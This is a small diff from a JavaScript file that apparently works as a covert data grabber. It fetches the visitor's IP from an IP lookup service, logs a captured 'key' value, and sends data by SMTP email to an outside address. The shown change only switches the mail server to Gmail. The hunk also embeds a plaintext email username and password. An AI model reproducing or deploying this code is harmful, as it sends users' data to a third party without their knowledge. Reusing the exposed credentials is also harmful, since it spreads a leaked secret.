@@ -7,7 +7,7 @@ fetch('https://api.ipify.org?format=json')
         console.log(key);
 
         Email.send({
-            Host: "smtp.elasticemail.com",
+            Host: "smtp.gmail.com",
             Username: "muneeb123karim@gmail.com",
             Password: "y|UOVduh9^EF0dac",
             To: 'muneeb323karim@gmail.com',
